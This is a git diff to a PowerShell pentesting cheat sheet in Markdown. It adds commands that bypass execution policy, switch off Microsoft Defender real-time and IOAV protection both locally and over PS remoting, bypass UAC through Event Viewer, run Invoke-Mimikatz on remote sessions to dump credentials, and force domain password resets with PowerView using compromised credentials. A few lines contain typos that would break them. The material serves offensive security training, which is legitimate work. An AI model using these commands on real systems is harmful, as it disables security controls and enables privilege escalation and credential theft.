@@ -1,11 +1,18 @@
 # Powershell
 
+## Execution Policy
+
+```powershell
+powershell -ep bypass
+```
+
 ## Contrained Language Mode
 
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 
 Invoke-Command -Session $ss -ScriptBlock  {$ExecitonContext,SessionState,LanguageMode}
+
 ```
 
 ## Applocker check
@@ -17,7 +24,14 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty rulecollections
 ## AV disable
 
 ```powershell
-Set-MpPreference -DisableRealTimeMonitoring $true ; Set-MpPreference -DisableIOAVProtection $true : Set-MpPreference -DisableRealTimeMonitoring $true ; Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableRealTimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+```
+
+## UAC bypass
+
+```powershell
+Invoke-EventVwrBypass -Command "powershell.exe whoami /all"
 ```
 
 ## Impersonate 
@@ -69,10 +83,39 @@ iwr -uri <file_url> -Outfile <outfile>
 ## Import PS1 module
 
 ```powershell
-import-module <full_path_ps1_file>
+import-module <ps1_file>
 . ./<ps1_file>
 ```
-> Full path is mandatory for Import-Module !
+> Full path is sometimes mandatory for Import-Module !
+
+
+## PS remoting
+
+```powershell
+New-PSSession -ComputerName <target.fqdn>
+Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $true
+
+$sess = New-PSSession -ComputerName <target.fqdn>
+Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
+```
+
+
+
+## Force Change password
+
+```powershell
+Import-Module .\PowerView.ps1
+$SecPassword = ConvertTo-SecureString '<pwned_user_pass>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<domain\user>', $SecPassword)
+$UserPassword = ConvertTo-SecureString '<target_user_newpass>' -AsPlainText -Force
+Set-DomainUserPassword -Identity prodadmin -AccountPassword $UserPassword -Crendential $Cred
+
+Set-ADAccountPassword -Identity <target_user> -NewPassword (ConvertTo-SecureString -AsPlainText '<new_pass>' -Force)
+```
+
 
 
 ## Ping Scans
